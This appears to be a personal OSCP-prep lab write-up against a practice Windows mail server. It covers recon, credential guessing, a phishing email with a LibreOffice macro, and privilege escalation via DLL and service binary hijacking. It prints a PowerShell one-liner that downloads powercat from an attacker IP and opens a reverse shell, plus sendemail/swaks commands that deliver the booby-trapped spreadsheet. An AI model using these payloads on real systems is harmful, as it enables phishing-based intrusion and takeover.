@@ -1,0 +1,361 @@
+**Start 16:13 26-02-2025**
+
+---
+```
+Scope:
+192.168.192.140
+```
+# Recon
+
+## Nmap
+
+```bash
+sudo nmap -sC -sV -vvvv -p- hepet -sT -T5 --min-rate=5000
+
+PORT      STATE SERVICE        REASON  VERSION
+25/tcp    open  smtp           syn-ack Mercury/32 smtpd (Mail server account Maiser)
+| smtp-commands: localhost Hello hepet; ESMTPs are:, TIME, SIZE 0, HELP
+|_ Recognized SMTP commands are: HELO EHLO MAIL RCPT DATA RSET AUTH NOOP QUIT HELP VRFY SOML Mail server account is 'Maiser'.
+79/tcp    open  finger         syn-ack Mercury/32 fingerd
+| finger: Login: Admin         Name: Mail System Administrator\x0D
+| \x0D
+|_[No profile information]\x0D
+105/tcp   open  ph-addressbook syn-ack Mercury/32 PH addressbook server
+106/tcp   open  pop3pw         syn-ack Mercury/32 poppass service
+110/tcp   open  pop3           syn-ack Mercury/32 pop3d
+|_pop3-capabilities: EXPIRE(NEVER) APOP UIDL TOP USER
+135/tcp   open  msrpc          syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn    syn-ack Microsoft Windows netbios-ssn
+143/tcp   open  imap           syn-ack Mercury/32 imapd 4.62
+|_imap-capabilities: CAPABILITY X-MERCURY-1A0001 OK complete AUTH=PLAIN IMAP4rev1
+443/tcp   open  ssl/http       syn-ack Apache httpd 2.4.46 (OpenSSL/1.1.1g PHP/7.3.23)
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Time Travel Company Page
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+| tls-alpn: 
+|_  http/1.1
+445/tcp   open  microsoft-ds?  syn-ack
+2224/tcp  open  http           syn-ack Mercury/32 httpd
+|_http-title: Mercury HTTP Services
+| http-methods: 
+|_  Supported Methods: GET HEAD
+5040/tcp  open  unknown        syn-ack
+7680/tcp  open  pando-pub?     syn-ack
+8000/tcp  open  http           syn-ack Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-title: Time Travel Company Page
+11100/tcp open  vnc            syn-ack VNC (protocol 3.8)
+| vnc-info: 
+|   Protocol version: 3.8
+|   Security types: 
+|_    Unknown security type (40)
+20001/tcp open  ftp            syn-ack FileZilla ftpd 0.9.41 beta
+|_ftp-bounce: bounce working!
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -r--r--r-- 1 ftp ftp            312 Oct 20  2020 .babelrc
+| -r--r--r-- 1 ftp ftp            147 Oct 20  2020 .editorconfig
+| -r--r--r-- 1 ftp ftp             23 Oct 20  2020 .eslintignore
+| -r--r--r-- 1 ftp ftp            779 Oct 20  2020 .eslintrc.js
+| -r--r--r-- 1 ftp ftp            167 Oct 20  2020 .gitignore
+| -r--r--r-- 1 ftp ftp            228 Oct 20  2020 .postcssrc.js
+| -r--r--r-- 1 ftp ftp            346 Oct 20  2020 .tern-project
+| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 build
+| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 config
+| -r--r--r-- 1 ftp ftp           1376 Oct 20  2020 index.html
+| -r--r--r-- 1 ftp ftp         425010 Oct 20  2020 package-lock.json
+| -r--r--r-- 1 ftp ftp           2454 Oct 20  2020 package.json
+| -r--r--r-- 1 ftp ftp           1100 Oct 20  2020 README.md
+| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 src
+| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 static
+|_-r--r--r-- 1 ftp ftp            127 Oct 20  2020 _redirects
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+33006/tcp open  mysql          syn-ack MariaDB 10.3.24 or later (unauthorized)
+49664/tcp open  msrpc          syn-ack Microsoft Windows RPC
+49665/tcp open  msrpc          syn-ack Microsoft Windows RPC
+49666/tcp open  msrpc          syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc          syn-ack Microsoft Windows RPC
+49668/tcp open  msrpc          syn-ack Microsoft Windows RPC
+49669/tcp open  msrpc          syn-ack Microsoft Windows RPC
+Service Info: Hosts: localhost, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+Metric shit ton of ports, let's start at the top.
+
+## 25/TCP - SMTP
+
+![](../../../assets/4b654dfc95bf89f264bad566041cae08.png)
+
+This gave me list of existing SMTP usernames.
+
+
+## 79/TCP - Finger
+
+![](../../../assets/645b46478e132b06eab82fb98fff6f9f.png)
+
+This is the same info `nmap` gave us. Other than that I've never heard of this service before, even after checking [hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-finger.html) I didn't find anything useful.
+
+
+## 443/TCP - HTTPS
+
+![](../../../assets/1521d5a031601aee81373ee6d73b6686.png)
+
+![](../../../assets/0b9e4fc37d08c7bd24a4dec2f52f735a.png)
+
+We get some names from the website, we could try and brute force later with them (some of these have also been found on [[#25/TCP - SMTP]]).
+
+```
+ela
+charlotte
+magnus
+agnes
+jonas
+martha
+```
+
+![](../../../assets/9ce87a7b3e7bdf053de169205bbcdac9.png)
+
+Furthermore we also notice that *jonas* has `SicMundusCreatusEst` as his title on the website, could be a password?
+
+>[!note]
+>Is that a **Dark** reference?!?!?! 
+
+```
+SicMundusCreatusEst
+```
+
+![](../../../assets/84b10a9851b6e4835edc5ce7f2d0b0d2.png)
+
+
+### Feroxbuster
+
+This didn't really yield anything valuable
+
+![](../../../assets/8e6329f11f2377f078125f8b4ca38ec0.png)
+
+
+## 2224/TCP - HTTP
+
+![](../../../assets/277fd57958bdf4d652ec6a8bce9e12a4.png)
+
+![](../../../assets/91f353aeff0544f696ada033d8e458ff.png)
+
+I went ahead and started looking for exploits regarding this version running:
+
+![](../../../assets/01276b3f6bbf7a9dd74aae7c64736580.png)
+
+This doesn't seem the way to go, let's hold this for now.
+
+
+## 105/106/110/TCP - POP3
+
+I try to log in using the possibly found creds.
+
+![](../../../assets/5c537cb9cc366fbd30cba3f55d2f2625.png)
+
+Awesome! Let's check it out.
+
+Email 1:
+
+![](../../../assets/a7ce39fa294f762d99fe6d2923261676.png)
+
+Email 2:
+
+![](../../../assets/19b709a11a68529722ec036a0827ff8f.png)
+
+Email 3:
+
+![](../../../assets/037b13ecb4418b1347d80d0a0f230928.png)
+
+Email 4:
+
+![](../../../assets/39e99cf11884d305a8276fa6a6f3d70a.png)
+
+They're absolutely right, this is terrible practice.
+
+So what can we make of this? Well if we check back at **Email 3** we see this part:
+
+![](../../../assets/3c86a9ce9ac6bc44d67e7921045d8160.png)
+
+>[!important] Situation
+>Since they're using **LibreOffice** that means that the mail server processes `.odt` * `.ods` files.
+If we look at the [[#Nmap]] results we can clearly see that there is **no entry point**, meaning this is HIGHLY LIKELY a *phishing* scenario.
+
+
+# Phishing for Access
+
+## Setting up Macro
+
+For our *phishing* attack to work, we will create a document with **LibreOffice** with a **Macro** inside, which will fire a reverse shell payload upon opening. We will have to submit this file using `swaks` since we don't have any other ability to upload this file.
+
+>[!note]
+>Since the mail specifically mentioned **spreadsheets** I will be doing this within **LibreOffice Calc** which creates a `.ods` file.
+>
+
+I open up **LibreOffice Calc** and save the file.
+
+![](../../../assets/91008d91bafab6b000fee3b334e06efc.png)
+
+I then head to **Tools -> Macros -> Edit Macros**:
+
+![](../../../assets/41d540f9648ac1a20a4dc4e8589ee430.png)
+
+Here I will insert the following:
+
+```powershell
+cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.220/powercat.ps1');powercat -c 192.168.45.220 -p 443 -e powershell
+```
+
+![](../../../assets/2fd923013e64a3ed59dd942f7ff956dd.png)
+
+Make sure that it's save under the same file:
+
+![](../../../assets/728e1d8e3a75ea6f664ead7b5b977427.png)
+
+Once done we save the Macro and close it.
+
+We will now head to **Tools -> Customize**:
+
+![](../../../assets/0c24fa07b85748d430dde6605b430907.png)
+
+Here we will select the following:
+
+![](../../../assets/5547187346def7735a57d4573680bbe2.png)
+
+Once this is done, we save the document and prep our *phishing* attack.
+
+
+## Sending email
+
+We set up our `body.txt`:
+
+![](../../../assets/d15581124bc25fe8c2e96cf598d1b95c.png)
+
+We set up our `swaks` command and send the mail.
+
+```bash
+sudo swaks -t agnes@localhost.com -t martha@localhost.com -t mailadmin@localhost.com  --from jonas@localhost.com --attach @sheet.ods --server 192.168.192.140 --body @body.txt --header "Subject: Spreadsheet" --suppress-data
+```
+
+![](../../../assets/68d9facc0eea17a173a783c06ea493f7.png)
+
+However `swaks` didn't work, so instead I used the `sendemail` tool which *did* give me a reverse shell:
+
+```bash
+sendemail -f 'jonas@localhost.com' -t 'mailadmin@localhost.com' 'martha@localhost.com' 'agnes@localhost.com' -s 192.168.192.140:25 -u 'Spreadsheet' -m 'Check my spreadsheet please' -a sheet.ods
+```
+
+![](../../../assets/0da6555ef4205d2f75d1165161e53fb9.png)
+
+
+# Foothold
+
+After a short wait I got the response:
+
+![](../../../assets/48733528fc0fb165bf747d8e1e736873.png)
+
+Hell yeah! Our phishing attempt worked, and we got a working reverse shell, let's start enumerating the target.
+
+
+## local.txt
+
+![](../../../assets/35cfc63a15843211a1ae4ab1bb847600.png)
+
+
+## Enumeration
+
+I start enumerating with `whoami /priv`:
+
+![](../../../assets/643942ce83ece678fddd9d925716220a.png)
+
+Unfortunately there's nothing useful.
+
+I then went ahead and checked out the `C:\` directory:
+
+![](../../../assets/5c173738d0cf87c73f4c34dfffe83184.png)
+
+A `.dll`? Could this potentially be a **DLL Hijacking**?
+
+![](../../../assets/33025c8e96c2725369f39f555e0b2944.png)
+
+This is good, all users have the (M) privilege, meaning I can HIGHLY LIKELY modify it to suit my needs.
+
+I then try to find the process running this `.dll` file, however it returns blank, which could LIKELY mean that the process is run under *Administrator* rights:
+
+```powershell
+Get-Process | Where-Object { $_.Modules -match "ImapX.dll" }
+```
+
+![](../../../assets/adf231419e73818debba4ae9423e9271.png)
+
+
+# Privilege Escalation
+## DLL Hijacking - FAIL
+
+I will now attempt to hijack the `.dll` by creating a reverse shell payload using `msfvenom`, then copying it over under the same name.
+
+![](../../../assets/a885906967883e79fcf14253812818fb.png)
+
+Unfortunately this too was a failed attempt.
+
+![](../../../assets/b4ad574fb240dd4e9ecf0564ac50de5d.png)
+
+Let's go ahead and enumerate further.
+
+![](../../../assets/3a15449d921021894e509832508af9fa.png)
+
+We find a directory called `Veyon` inside our home directory.
+
+![](../../../assets/4d5c6e6268804be280f517a09fe6ed21.png)
+
+So could this be a **Service Binary Hijacking** instead then?
+
+Let's look up the service.
+
+
+## Service Binary Hijacking
+
+```powershell
+sc.exe qc VeyonService
+```
+
+![](../../../assets/ccd26e91222d90beff31a0780d65656a.png)
+
+Nice it's running under *SYSTEM* privileges, let's change it with a rev shell.
+
+![](../../../assets/6be45ba460c287246fec662b3e27339f.png)
+
+![](../../../assets/5ff1965e287c2ff6c43bab596bb306a9.png)
+
+![](../../../assets/45ac30a946729403a3ce3a163a86f0a4.png)
+
+Apparently we can't stop nor restart the service, we still have the `shutdown /r` trick up our sleeve, since the service is set to `AUTO_START` that means that it will start on start up. Let's shutdown the system.
+
+![](../../../assets/8742e96651edc9d03d4decee0f31b681.png)
+
+After a short while...
+
+![](../../../assets/6bb217af7d3fff89f599bfc580aa4eaf.png)
+
+
+## proof.txt
+
+![](../../../assets/29f48f0ce75b74dc13eb7a23a07cf015.png)
+
+>[!summary]
+>Challenging but fun, found out the hard way that apparently `swaks` is not always the best tool for *phishing*.
+
+---
+
+**Finished 18:28 26-02-2025**
+
+[^Links]:  [[OSCP Prep]]
+
+#phishing 
